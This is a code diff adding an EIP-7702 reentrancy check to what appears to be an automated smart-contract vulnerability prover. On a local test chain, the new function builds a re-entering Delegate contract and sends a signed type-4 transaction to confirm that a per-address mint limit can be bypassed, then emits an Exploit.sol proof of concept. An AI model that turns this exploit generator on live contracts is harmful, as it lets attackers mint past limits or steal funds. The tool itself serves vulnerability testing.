@@ -2411,6 +2411,134 @@ def _synth_callback_inconsistency(name, target_src, invariants_src, manifest, sc
     return None
 
 
+def _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_step, t0):
+    """EIP-7702 재진입 동적 증명: 수신자 콜백을 mint 이전에 호출하고 `tx.origin==msg.sender`
+    EOA 게이트만 있는(그리고 nonReentrant 없는) 경로에서, 코드를 위임받은 EOA(7702)가
+    콜백 재진입으로 per-caller 한도(balanceOf==0)를 우회해 2개 이상 민팅함을 실제로 관찰한다.
+    py-evm prague + eth_account.sign_authorization 로 type-4 트랜잭션을 보낸다.
+    (타깃이 컴파일되지 않으면 — 예: 외부 import 미해결 — None; 그 경우 정적 휴리스틱이 보고한다.)"""
+    import solcx
+    from web3 import Web3
+    from eth_account import Account
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # 수신자 콜백(mint 이전) 흔적
+    if not re.search(r"|".join(_RECEIVER_HOOKS), tb) and not re.search(r"encodeWithSignature\s*\(\s*\"(\w+)\(", tb):
+        return None
+    # EOA 게이트(tx.origin==msg.sender) + nonReentrant 없는 무인자 external 진입점
+    entry = None
+    for fn in _functions(tb):
+        if fn["external"] and not fn["args"] and "nonReentrant" not in fn["head"] \
+                and re.search(r"tx\.origin\s*==\s*msg\.sender|msg\.sender\s*==\s*tx\.origin", fn["body"]):
+            entry = fn["name"]; break
+    if not entry:
+        return None
+    # 콜백 시그니처/구현 결정
+    cbimpl = None
+    em = re.search(r"encodeWithSignature\s*\(\s*\"(\w+)\(([^\"]*)\)\"", tb)
+    if re.search(r"checkOnERC721Received|onERC721Received", tb):
+        cbimpl = ("function onERC721Received(address,address,uint256,bytes calldata) external "
+                  "returns (bytes4) { _reenter(); return 0x150b7a02; }")
+    elif re.search(r"onERC1155Received", tb):
+        cbimpl = ("function onERC1155Received(address,address,uint256,uint256,bytes calldata) external "
+                  "returns (bytes4) { _reenter(); return 0xf23a6e61; }")
+    elif em:
+        cbname = em.group(1); cbargs = em.group(2).strip()
+        params = ", ".join(f"{a.strip()} p{i}" for i, a in enumerate(cbargs.split(",")) if a.strip())
+        cbimpl = f"function {cbname}({params}) external {{ _reenter(); }}"
+    else:
+        return None
+    # balanceOf(address) 게터로 per-caller 카운트를 관찰(없으면 이 경로 보류)
+    _solcv, _evm = _solc_for(target_src)
+    dele = (HEADER +
+        f"interface IT {{ function {entry}() external; }}\n"
+        "contract Delegate {\n"
+        "    bool entered;\n"
+        "    function _reenter() internal { if (!entered) { entered = true; "
+        f"IT(msg.sender).{entry}(); }} }}\n"
+        f"    {cbimpl}\n"
+        "}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Delegate.sol":{"content":dele}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try:
+        compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception:
+        return None   # 컴파일 실패(외부 import 등) → 정적 휴리스틱이 처리
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Delegate" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    bal_of = any(e.get("type")=="function" and e.get("name")=="balanceOf"
+                 and [i["type"] for i in e.get("inputs",[])]==["address"] for e in abi)
+    if not bal_of:
+        return None
+    w3, acct = _mk_evm()
+    try:
+        backend = w3.provider.ethereum_tester.backend
+        keys = backend.account_keys
+    except Exception:
+        return None
+    accts = list(w3.eth.accounts)
+    if len(accts) < 3:
+        return None
+    deployer = accts[0]; attacker = accts[1]; atk_key = keys[1]
+    def deploy(cn):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        r = w3.eth.wait_for_transaction_receipt(C.constructor().transact({"from":deployer,"gas":9_000_000}))
+        return r.contractAddress
+    try:
+        taddr = deploy(name); daddr = deploy("Delegate")
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    try:
+        b0 = int(tc.functions.balanceOf(attacker).call())
+    except Exception:
+        return None
+    cid = w3.eth.chain_id
+    nonce = w3.eth.get_transaction_count(attacker)
+    try:
+        # authority == tx sender → 인증 nonce = tx nonce + 1
+        auth = Account.sign_authorization({"chainId":cid,"address":daddr,"nonce":nonce+1}, atk_key)
+        sel = Web3.keccak(text=f"{entry}()")[:4]
+        tx = {"chainId":cid,"to":taddr,"value":0,"gas":3_000_000,
+              "maxFeePerGas":10**11,"maxPriorityFeePerGas":10**9,"nonce":nonce,
+              "data":sel,"authorizationList":[auth]}
+        signed = Account.sign_transaction(tx, atk_key)
+        rc = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(signed.raw_transaction))
+        if int(rc.status) != 1:
+            return None
+    except Exception:
+        return None
+    b1 = int(tc.functions.balanceOf(attacker).call())
+    if not (b1 > 1 and b1 > b0):     # 유일성/한도(≤1) 위반을 실제 관찰
+        return None
+    poc = (HEADER +
+        "// Strategy: EIP-7702 reentrancy. The mint runs a receiver callback BEFORE committing\n"
+        "// state, and the free path is gated only by tx.origin==msg.sender. A 7702-delegated\n"
+        "// EOA satisfies that gate yet has code, so the callback re-enters the unguarded mint\n"
+        "// while balanceOf is still 0, minting past the per-address limit.\n"
+        "// (Attacker signs an EIP-7702 authorization to the Delegate below, then sends a\n"
+        "//  type-4 SetCode tx calling " + entry + "().)\n"
+        f"interface IT {{ function {entry}() external; }}\n"
+        "contract Delegate {\n"
+        "    bool entered;\n"
+        f"    function _reenter() internal {{ if (!entered) {{ entered = true; IT(msg.sender).{entry}(); }} }}\n"
+        f"    {cbimpl}\n"
+        "}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (eip7702-reentrancy)","strategy":"eip7702-reentrancy","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"per-address uniqueness broken (balanceOf → {b1})",
+            "strategy":f"eip7702-reentrancy:{entry}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"EIP-7702 로 코드를 위임받은 EOA 가 mint 이전 콜백으로 재진입해 per-caller 한도를 우회, 2개 이상 민팅했습니다(type-4 트랜잭션 실제 실행).",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_force(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Force 류: receive/fallback/payable 이 전혀 없는 '받을 수 없는' 컨트랙트에
     selfdestruct 로 ETH 를 강제 주입한다. 잔액이 0 에서 양수로 바뀌는지로 증명한다.
@@ -4037,6 +4165,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0v) EIP-7702 재진입 (mint 이전 콜백 + tx.origin EOA 게이트) — 동적 증명
+    try:
+        r = _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 1) 호출 시퀀스 탐색 — 점진 심화(progressive deepening) 루프.
     #    라운드마다 예산·시퀀스 깊이·입력 풀을 키워 "끝까지 물어뜯되", 판정은 항상
     #    배포직후 건강기준의 실제 효과 관찰이라 더 깊이 파도 오탐이 생기지 않는다.
@@ -4118,7 +4253,8 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force,
                _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber,
                _synth_higher_order, _synth_switch, _synth_array_underflow,
-               _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan):
+               _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan,
+               _synth_eip7702_reentrancy):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
